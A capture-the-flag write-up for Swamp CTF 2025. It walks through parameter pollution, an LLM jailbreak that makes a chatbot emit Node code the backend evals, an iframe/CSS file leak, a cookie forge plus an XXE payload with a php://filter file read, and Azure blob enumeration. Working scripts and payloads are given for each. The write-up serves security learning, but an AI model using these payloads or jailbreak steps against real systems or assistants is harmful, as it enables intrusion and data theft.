---
date: March 31, 2025
description: Ruby+Python, AI jailbreak RCE, XXE, Azure Storage
platform: Swamp CTF 2025
categories: Web, Misc
tags:
---

# Web
## Contamination
#server-side-parameter-pollution #ruby #python #json

I have created a safe reverse proxy that only forwards requests to retrieve debug information from the backend. What could go wrong?

[http://chals.swampctf.com:41234](http://chals.swampctf.com:41234)

### Challenge 
ruby proxy only accepts `getInfo` action query parameter and it passes the params and body to python backend for processing . The challenge is we must somehow pass a `getFlag` action query parameter in the backend then trigger error in the json body to leak the flag

### Solution
to bypass param checks we can use `?action=getFlag&action=getInfo` the backend handles it differently and once it goes to the backend the `getFlag` action will be checked

to trigger error tried techniques described here https://bishopfox.com/blog/json-interoperability-vulnerabilities. 

```python
import requests as r 

url = "http://chals.swampctf.com:41234"
headers = {
    "Content-Type": "application/json"
}
query = "?action=getFlag&action=getInfo"
data = '{"key": "value",//\n"test":"1"}'

resp=r.post(url+query, headers=headers,data=data)
print(resp.text)
```
![](_attachments/Pasted%20image%2020250330045550.png)

>Using different stacks to handle inputs can cause unintended side effects 

References:
- https://portswigger.net/web-security/api-testing/server-side-parameter-pollution
- https://bishopfox.com/blog/json-interoperability-vulnerabilities
- https://github.com/BishopFox/json-interop-vuln-labs

## Maybe Happy Ending
#whitebox #code-injection/node #LLM #ai-jailbreak  

Welcome to MaybeHappyEndingGPT! In this cyberpunk musical's universe, robots and AI coexist with humans in Seoul circa 2050. You'll be working with Hwaboon, a plant-care robot assistant who brings warmth and nurturing wisdom to the digital age.

[http://chals.swampctf.com:50207](http://chals.swampctf.com:50207)
### Challenge 
The challenge is to jailbreak AI to send Node commands that is executed by the backend before returning response. 

essentially this is the vulnerability in `routes.ts`
```ts
    try {
      const flag = await eval(content);
      return NextResponse.json({
        response: flag
      });
    } catch (error) {
      console.error('Error in chat API route:', error);
    }
```
It will try eval then returned so if we made it to say  `1+1` it will eval to `2`. same with malicious code. as long as it is a valid syntax

### Solution
I solved it via browsers prompts, basically: 
1. Tell it to remove emoji responses  
2. Tell it to repeat what you said without extra interpretations
3. Get it to say a malicious NodeJS code
https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet

![](_attachments/Pasted%20image%2020250330035227.png)

payload used 
```js
require('fs').readdirSync('.').toString()
require('fs').readFileSync('flag.txt').toString();
```

> Deploy in own machine first too see and modify docker instance responses 






## Editor
#whitebox #xss #iframe 

I took a few hours to create a simple HTML/CSS previewer system. Since there's no way to add JavaScript then my server should be safe, right?

Grab the flag from the `http://chals.swampctf.com:47821/flag.txt` file on the server to show that this isn't the case.

The flag is in the standard format. Good luck!

[http://chals.swampctf.com:47821](http://chals.swampctf.com:47821)

### Challenge 
XSS challenge leak the flag at `http://chals.swampctf.com:47821/flag.txt`  

`app.component.ts`
```ts
  private updateRenderedPage = (html: string, css: string) => {
	const content = html
		.replace(/<script[\s\S]*?>[\s\S]*?<\/script>/gi, "")
		.replace(/\son\w+="[^"]*"/gi, "")
		.replace(
			/<style class=['"]custom-user-css['"]><\/style>/,
    		`<style class='custom-user-css'>${css}</style>`
   		);

    const iframeDoc = this.previewIframe?.nativeElement.contentDocument!;
    iframeDoc?.open();
    iframeDoc?.write(content);
    iframeDoc?.close();
  }

```
### Solution
Saw iframes being used and tried leaking using it 
```html
<iframe src="/flag.txt"></iframe>
```

Apparently the intended way is to use e CSS `@import url()`

writeups from other players
```css
  @font-face {
    font-family: 'flag';
    src: url('http://chals.swampctf.com:47821/flag.txt');
  }
  body {
    font-family: 'flag', sans-serif;
    content: "Flag is being loaded as a font (check server logs)";
  }
```

![](_attachments/Pasted%20image%2020250330052757.png)

## SwampTech Solutions
#blackbox #view-src #IDOR #XXE

My internship is ending. My final challenge? Defeat Albert in a Capture the Flag challenge. He doesn't have fingers. He doesn't need them. I have never been more afraid.

Wish me luck.

[http://chals.swampctf.com:40043/](http://chals.swampctf.com:40043/)
### Challenge
This is a blackbox challenge the only clues we can find is at http://chals.swampctf.com:40043/myreallycoolinternjournal.txt which was found at robots.txt. 

### Solution
First we have to find valid credentials in view source 
view-source:http://chals.swampctf.com:40043/login.php
```html
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" href="styles/login.css">
</head>
<body>
    <div class="container">
        <h1>Login to your dashboard</h1>
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required><br><br><br>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
<!-- TEST USER CREDENTIALS -->
 <!-- guest:iambutalowlyguest -->
</html>

```
Then we can see there's an admin page but our user does not have access 
http://chals.swampctf.com:40043/adminpage.php

There is IDOR vuln in the cookies that allows privilege escalation by checking hte user cookies, was only the MD5 hash of 
`guest`  we can change our cookies to `"Cookie": "user=21232f297a57a5a743894a0e4a801fc3` to be able to access `/adminpage.php`

After that there is an hidden+obfuscated code in the functionality in the adminpage

![](_attachments/Pasted%20image%2020250331205617.png)

remove hidden attribute and try submitting the request and check the network tab we see it accepts an XML entity in the following format:

```xml
<root>
	<name>John</name>
	<email>john@swamptech.com</email>
</root>
```


Use XXE payloads to get the flag, since the stack is using PHP, i tried to exfil PHP wrappers filter base64 function to not break xml from special characters  

solve.py
```python
import requests as r 
import base64
import hashlib 

url = "http://chals.swampctf.com:40043"

user = "admin"
headers = {
    "Cookie": f"user={hashlib.md5(user.encode()).hexdigest()}",
}

def submit_process(xml):
    data = {
        "submitdata": xml
    }
    resp = r.post(f"{url}/process.php", headers=headers, data=data)
    content = resp.text.split("SEP")
    print(base64.b64decode(content[1]).decode())


# xml =  '<?xml version="1.0" encoding="UTf-8" ?><!DOCTYPE name [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=process.php">]><root><name>SEP&xxe;SEP</name><email>test@swamptech.com</email></root>'
xml =  '<?xml version="1.0" encoding="UTf-8" ?><!DOCTYPE name [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=flag.txt">]><root><name>SEP&xxe;SEP</name><email>test@swamptech.com</email></root>'

submit_process(xml)
```

Additionally we can determine the absolute path of the flag by checking the file_exist feature in the admin but its not needed to solve. example `../html/flag.txt` returns true

Saved some php source code in the exfil folder. API endpoints are full of rabbit holes. 



# Misc
## Blue
The SwampCTF team is trying to move our infrastructure to the cloud. For now, we've made a storage account called `swampctf` on Azure. Can you test our security by looking for a flag?

### Solution
Enumerate Azure Storage accounts 
used this tool https://github.com/NetSPI/MicroBurst/blob/master/Misc/Invoke-EnumerateAzureBlobs.ps1
```powershell
Import-Module .\Invoke-EnumerateAzureBlobs.ps1
Invoke-EnumerateAzureBlobs -Base swampctf
```
returns `swampctf.blob.core.windows.net`

fuzzing storage content then we get the flag 
```bash
ffuf -u "https://swampctf.blob.core.windows.net/FUZZ?restype=container&comp=list" -w /usr/share/SecLists/Discovery/Web-Content/raft-large-words.txt

curl "https://swampctf.blob.core.windows.net/test?restype=container&comp=list"

curl "https://swampctf.blob.core.windows.net/test/flag_020525.txt"
```
can also azure storage explorer
![](_attachments/Pasted%20image%2020250331015301.png)

Tools 
- https://github.com/NetSPI/MicroBurst
- https://github.com/Macmod/goblob